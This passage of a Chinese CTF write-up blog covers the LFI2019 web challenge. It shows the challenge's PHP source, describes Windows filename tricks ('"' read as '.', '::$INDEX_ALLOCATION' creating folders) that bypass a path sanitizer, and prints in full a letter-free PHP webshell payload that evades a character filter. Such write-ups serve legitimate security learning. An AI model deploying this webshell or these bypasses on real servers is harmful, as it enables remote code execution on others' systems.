</span><span class=c1></span>    <span class=nv>$parsed_url</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;&amp;&#34;</span><span class=p>,</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;QUERY_STRING&#39;</span><span class=p>]);</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>count</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>2</span><span class=p>){</span>
        <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Content-Type:text/json&#34;</span><span class=p>);</span>
        <span class=k>switch</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>0</span><span class=p>]){</span>
            <span class=k>case</span> <span class=s2>&#34;get&#34;</span><span class=o>:</span>
                <span class=nv>$get</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Get</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
                <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$get</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>();</span>
                <span class=k>break</span><span class=p>;</span>
            <span class=k>case</span> <span class=s2>&#34;put&#34;</span><span class=o>:</span>
                <span class=nv>$put</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Put</span><span class=p>(</span><span class=nv>$parsed_url</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=nv>$_POST</span><span class=p>);</span>
                <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$put</span><span class=o>-&gt;</span><span class=na>put</span><span class=p>();</span>
                <span class=k>break</span><span class=p>;</span>
            <span class=k>default</span><span class=o>:</span>
                <span class=nv>$data</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;Invalid data.&#34;</span><span class=p>];</span>
                <span class=k>break</span><span class=p>;</span>
        <span class=p>}</span>
        <span class=k>die</span><span class=p>(</span><span class=nx>json_encode</span><span class=p>(</span><span class=nv>$data</span><span class=p>));</span>
    <span class=p>}</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;!doctype html&gt;
</span><span class=err>&lt;html&gt;
</span><span class=err>&lt;head&gt;
</span><span class=err>    &lt;meta charset=utf-8&gt;
</span><span class=err>    &lt;link rel=&#34;stylesheet&#34; href=&#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span><span class=err>    &lt;link rel=&#34;styleshhet&#34; href=&#34;//fonts.googleapis.com/css?family=Muli:300,400,700&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span><span class=err>    &lt;link rel=&#34;stylesheet&#34; href=&#34;./static/legit.css&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;
</span><span class=err>    &lt;title&gt;LFI2019&lt;/title&gt;
</span><span class=err>&lt;/head&gt;
</span><span class=err>&lt;body&gt;
</span><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;put-modal&#34;&gt;
</span><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span><span class=err>                    &lt;h5 class=&#34;modal-title&#34;&gt;put2019&lt;/h5&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-label=&#34;Close&#34;&gt;
</span><span class=err>                        &lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;
</span><span class=err>                    &lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span><span class=err>                        &lt;label for=&#34;upload-filename&#34; class=&#34;col-form-label&#34;&gt;Filename:&lt;/label&gt;
</span><span class=err>                        &lt;input type=&#34;text&#34; class=&#34;form-control&#34; id=&#34;upload-filename&#34;&gt;
</span><span class=err>                    &lt;/div&gt;
</span><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span><span class=err>                        &lt;label for=&#34;upload-content&#34; class=&#34;col-form-label&#34;&gt;Content:&lt;/label&gt;
</span><span class=err>                        &lt;textarea class=&#34;form-control disabled&#34; id=&#34;upload-content&#34; rows=10&gt;&lt;/textarea&gt;
</span><span class=err>                    &lt;/div&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#34;upload-submit&#34;&gt;put();&lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>            &lt;/div&gt;
</span><span class=err>        &lt;/div&gt;
</span><span class=err>    &lt;/div&gt;
</span><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;get-modal&#34;&gt;
</span><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span><span class=err>                    &lt;h5 class=&#34;modal-title&#34;&gt;get2019&lt;/h5&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-label=&#34;Close&#34;&gt;
</span><span class=err>                        &lt;span aria-hidden=&#34;true&#34;&gt;&amp;times;&lt;/span&gt;
</span><span class=err>                    &lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span><span class=err>                        &lt;label for=&#34;include-filename&#34; class=&#34;col-form-label&#34;&gt;Filename:&lt;/label&gt;
</span><span class=err>                        &lt;input type=&#34;text&#34; class=&#34;form-control&#34; id=&#34;include-filename&#34;&gt;
</span><span class=err>                    &lt;/div&gt;
</span><span class=err>                    &lt;div class=&#34;form-group&#34;&gt;
</span><span class=err>                        &lt;textarea class=&#34;form-control disabled&#34; id=&#34;include-content&#34; disabled rows=10&gt;&lt;/textarea&gt;
</span><span class=err>                    &lt;/div&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-secondary&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-primary&#34; id=&#34;include-submit&#34;&gt;include();&lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>            &lt;/div&gt;
</span><span class=err>        &lt;/div&gt;
</span><span class=err>    &lt;/div&gt;
</span><span class=err>    &lt;div class=&#34;modal fade&#34; id=&#34;info-modal&#34;&gt;
</span><span class=err>        &lt;div class=&#34;modal-dialog modal-lg&#34;&gt;
</span><span class=err>            &lt;div class=&#34;modal-content&#34;&gt;
</span><span class=err>                &lt;div class=&#34;modal-header&#34;&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;close&#34; data-dismiss=&#34;modal&#34; aria-hidden=&#34;true&#34;&gt;×&lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-body&#34;&gt;
</span><span class=err>                    &lt;p&gt;
</span><span class=err>                        Hi there! We introduce LFI2019 with another technique that never came out on CTFs. 
</span><span class=err>                        We want to end tedious LFI challenges starting from this year.
</span><span class=err>                        Traps are everywhere, so be warned. Good Luck!
</span><span class=err>                    &lt;/p&gt;
</span><span class=err>                    &lt;p&gt;
</span><span class=err>                        .. and of course, the main objective for this challenge is absolutely straightforward: Leak the sourcecode of flag file to solve this challenge. flag is located at &lt;code&gt;flag.php&lt;/code&gt;.
</span><span class=err>                    &lt;/p&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>                &lt;div class=&#34;modal-footer&#34;&gt;
</span><span class=err>                    &lt;button type=&#34;button&#34; class=&#34;btn btn-default&#34; data-dismiss=&#34;modal&#34;&gt;Close&lt;/button&gt;
</span><span class=err>                &lt;/div&gt;
</span><span class=err>            &lt;/div&gt;
</span><span class=err>        &lt;/div&gt;
</span><span class=err>    &lt;/div&gt;
</span><span class=err>    &lt;ul class=&#34;text hidden&#34;&gt;
</span><span class=err>        &lt;li&gt;L&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;e&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;g&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;t&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;spaced&#34;&gt;F&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;l&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;e&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;spaced&#34;&gt;I&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;n&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;c&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;l&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;u&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;s&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;i&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;o&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;ghost&#34;&gt;n&lt;/li&gt;
</span><span class=err>        &lt;li class=&#34;spaced&#34;&gt;2019&lt;/li&gt;
</span><span class=err>        &lt;br&gt;
</span><span class=err>		&lt;br&gt;
</span><span class=err>        &lt;div class=&#34;hide&#34; id=&#34;kawaii&#34;&gt;
</span><span class=err>            &lt;center&gt;
</span><span class=err>                &lt;button class=&#34;btn col-4 btn-success half&#34; id=&#34;get&#34;&gt;include&lt;/button&gt;
</span><span class=err>                &lt;button class=&#34;btn col-4 btn-warning&#34; id=&#34;put&#34;&gt;upload&lt;/button&gt;
</span><span class=err>                &lt;button class=&#34;btn col-3 btn-info&#34; id=&#34;info&#34;&gt;info&lt;/button&gt;
</span><span class=err>                &lt;p class=&#34;lightgrey&#34;&gt;
</span><span class=err>                    Reference ID: &lt;b class=&#34;ref&#34;&gt;&lt;?php echo $seed; ?&gt;&lt;/b&gt;
</span><span class=err>                &lt;/p&gt;
</span><span class=err>                Made with &amp;hearts; by stypr.
</span><span class=err>            &lt;/center&gt;
</span><span class=err>        &lt;/div&gt;
</span><span class=err>    &lt;/ul&gt;
</span><span class=err>    &lt;script src=&#34;https://code.jquery.com/jquery-3.3.1.min.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;&lt;/script&gt;
</span><span class=err>    &lt;script src=&#34;//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34;&gt;&lt;/script&gt;
</span><span class=err>    &lt;script src=&#34;./static/legit.js&#34; nonce=&#34;&lt;?php echo $seed; ?&gt;&#34; defer&gt;&lt;/script&gt;
</span><span class=err>&lt;/body&gt;
</span><span class=err>&lt;/html&gt;
</span><span class=err>&lt;!-- https://www.youtube.com/watch?v=OEpeRmPkRIU --&gt;
</span></code></pre></div><p>不过比较无语的是有很多的垃圾代码&mldr;可以看到有个出题人留的后门函数，but 因为<code>code_sanitizer</code>的过滤</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=c1>// The new kakkoii code-san is re-implemented. //
</span><span class=c1></span><span class=k>function</span> <span class=nf>code_sanitizer</span><span class=p>(</span><span class=nv>$code</span><span class=p>){</span>
    <span class=c1>// Computer-chan, please don&#39;t speak english. Speak something else! //
</span><span class=c1></span>    <span class=nv>$code</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-</span><span class=se>\\</span><span class=s2>\&#39;</span><span class=se>\&#34;</span><span class=s2>\=\(\)\[\]\;]/u&#34;</span><span class=p>,</span> <span class=s2>&#34;*Nope*&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$code</span><span class=p>);</span>
    <span class=k>return</span> <span class=nv>$code</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></div><p>这里我们可以使用无字母的 webshell 来进行一个绕过，可以参考<a class=link href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#_4 target=_blank rel=noopener>一些不包含数字和字母的webshell</a>，这里我就直接放 ROIS 师傅们的无字母 webshell 内容了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?=</span><span class=nv>$_</span><span class=o>=</span><span class=p>[]</span><span class=cp>?&gt;</span><span class=err>&lt;?=$_=@&#34;$_&#34;?&gt;&lt;?=$___=$_[&#39;!&#39;!=&#39;@&#39;]?&gt;&lt;?=$____=$_[(&#39;!&#39;==&#39;!&#39;)+(&#39;!&#39;==&#39;!&#39;)+(&#39;!&#39;==&#39;!&#39;)]?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;_&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;_&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____=$__?&gt;&lt;?=$__=&#39;&#39;?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=&#34;.&#34;?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_=$____?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$_++?&gt;&lt;?=$__.=$_?&gt;&lt;?=$_____($__)?&gt;
</span></code></pre></div><p>不过他们可能搞错了，这里他们本意想用<code>&lt;?=?></code>来绕过<code>;</code>限制，但是其实<code>;</code>并没有过滤&mldr;</p>
<p>最后一步可以说有了，我们来看看前几步，<code>Put</code>类的<code>__construct</code>有一个<code>path_sanitizer</code>，我们可以看到有一些检查什么的，没有<code>false</code>的情况是不会过滤<code>/</code>的，这里初始化的时候不会过滤<code>/</code>。</p>
<p>所以如果我们在写文件的时候，用<code>put&test/test</code>去写<code>test</code>目录<code>test</code>文件，<code>file_put_contents</code>会因为<code>test</code>目录不存在而写不进去。</p>
<pre tabindex=0><code>file_put_contents(./test/test): failed to open stream: No such file or directory
</code></pre><p>那如果我们直接写进一个<code>test</code>文件呢？写是没有问题的，但是我们在用<code>get</code>路由读的时候就会发生问题了。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>function</span> <span class=nf>get</span><span class=p>(){</span>
  <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span> <span class=o>===</span> <span class=k>false</span><span class=p>){</span>
    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;blocked by path sanitizer&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
  <span class=p>}</span>
  <span class=c1>// wtf???? //
</span><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=o>!@</span><span class=nx>file_exists</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>)){</span>
    <span class=c1>// index files are *completely* disabled. //
</span><span class=c1></span>    <span class=k>if</span><span class=p>(</span><span class=nx>stripos</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>){</span>
      <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;you cannot include index files!&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
    <span class=p>}</span>

    <span class=c1>// hardened sanitizer spawned. thus we sense ambiguity //
</span><span class=c1></span>    <span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>;</span>
    <span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nx>path_sanitizer</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
    <span class=k>if</span><span class=p>(</span><span class=nv>$read_file</span> <span class=o>===</span> <span class=nv>$read_file_with_hardened_filter</span> <span class=o>||</span>
       <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>===</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)){</span>
      <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;request blocked&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
    <span class=p>}</span>
    <span class=c1>// .. and finally, include *un*exploitable file is included. //
</span><span class=c1></span>    <span class=o>@</span><span class=k>include</span><span class=p>(</span><span class=s2>&#34;./files/&#34;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filename</span><span class=p>);</span>
    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;success&#34;</span><span class=p>];</span>
  <span class=p>}</span><span class=k>else</span><span class=p>{</span>
    <span class=k>return</span> <span class=p>[</span><span class=s2>&#34;msg&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;invalid filename (wtf)&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;error&#34;</span><span class=p>];</span>
  <span class=p>}</span>
<span class=p>}</span>
</code></pre></div><p>我们仔细看这段代码，由于<code>path_sanitizer</code>传入了<code>true</code>，这里会把传入的文件名当中<code>/</code>过滤为空，然后有一个比较，如果直接拼接得到的路径与拼接上过滤之后得到的路径相等的话，会进一步比较他们的文件内容，如果相等的话就会被 block &mldr;而我们要进行 include ，那就需要绕过这两个判断&mldr;</p>
<p>什么个意思呢？就是即使文件名相等，内容也不能相等。</p>
<p>但是我们这里要注意<code>path_sanitizer</code>，如果我们传入一个含有<code>/</code>的文件名那就可以利用这个方法绕过文件名的判断，直接进行包含了。</p>
<p>而题目环境我们可以由一开始的 phpinfo 得到是一个 windows 的环境（虽然赛场是没有的，但是也可以通过各种方法判断一下，比如 nmap 啥的&mldr;）</p>
<p>所以我们现在主要就是绕读写文件这一块了。</p>
<h3 id=trick-1>Trick 1</h3>
<blockquote>
<p>​ 对于Windows的文件读取，有一个小 Trick ：使用<code>FindFirstFile</code>这个API的时候，其会把<code>"</code>解释为<code>.</code>。</p>
<pre tabindex=0><code>shell&quot;php === shell.php		//true
</code></pre></blockquote>
<p>所以我们可以利用这个 trick ，来构造文件名为<code>"/test</code>的文件，什么个意思呢？</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nv>$read_file</span> <span class=o>=</span> <span class=s2>&#34;./files/./test&#34;</span><span class=p>;</span>
<span class=nv>$read_file_with_hardened_filter</span> <span class=o>=</span> <span class=s2>&#34;./files/.test&#34;</span><span class=p>;</span>
<span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file</span><span class=p>)</span> <span class=o>=</span> <span class=s1>&#39;实际文件内容&#39;</span><span class=p>;</span>
<span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$read_file_with_hardened_filter</span><span class=p>)</span> <span class=o>=</span> <span class=k>false</span> <span class=c1>//文件不存在
</span></code></pre></div><p>传入的<code>"/test</code>文件名，由于这个 trick ，会被 Windows 认为是<code>./test</code>，所以在处理这个方式上就产生了差异也就绕过了两个判断</p>
<h3 id=trick-2>Trick 2</h3>
<p>可以参考 <a class=link href=https://c1h3ng.github.io/web/2018/06/19/windows-tricks/ target=_blank rel=noopener>windows的一些特性</a> 这篇文章，文章最后告诉我们，可以上传一个文件名为<code>test::$INDEX_ALLOCATION</code>的文件，就相当于创建了一个<code>test</code>的文件夹，详细原理可以看该篇文章。</p>
<p>这样我们就可以先用这个 Trick 创建一个文件夹<code>test</code>，然后用<code>put</code>随意写一个文件<code>test/file</code>，在读取的时候，由于<code>path_sanitizer</code>会把我们的<code>/</code>过滤，就成功绕过了文件名的判断了。绕过了这些就只剩下无字母写 webshell 的问题了。</p>
<h2 id=noxss>noxss</h2>
<p>单独为这道题开一篇文章来写，真的tql&mldr;</p>
<h2 id=tfboys>tfboys</h2>
<p>机器学习的题目，表示不会&mldr;地址在 <a class=link href=https://github.com/Xyntax/XCTF-2019-tfboys target=_blank rel=noopener>XCTF-2019-tfboys</a></p>
<h1 id=conclusion>Conclusion</h1>
<p>体验极其好的一次比赛，非常感谢 @r3kapig 师傅们的精心准备，毫不夸张地说，这是本年度体验最好的一场比赛，无论从题目质量或者是从比赛过程的体验，都是非常棒的。希望国内以后更多一些这类的良心比赛！</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113235515.jpeg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191113235515.jpeg loading=lazy>
</a>
</figure></p>
</section>
<footer class=article-footer>
<section class=article-tags>
